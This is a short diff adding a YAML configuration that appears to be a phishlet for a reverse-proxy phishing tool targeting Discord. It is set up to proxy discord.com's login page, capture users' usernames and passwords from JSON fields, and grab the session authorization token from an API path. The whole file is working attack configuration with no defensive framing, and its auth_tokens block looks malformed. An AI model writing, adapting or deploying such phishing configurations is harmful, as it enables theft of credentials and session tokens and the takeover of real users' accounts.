@@ -1,0 +1,22 @@
+author: '@StephanWithPH'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'discord.com', session: true, is_landing: true, auto_filter: true}
+auth_tokens:
+  domain: 'discord.com'
+    path: '/api/v9/users/@me/affinities/guilds'
+    name: 'token'
+    header: 'authorization'
+    type: 'http'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'json'
+login:
+  domain: 'discord.com'
+  path: '/login'
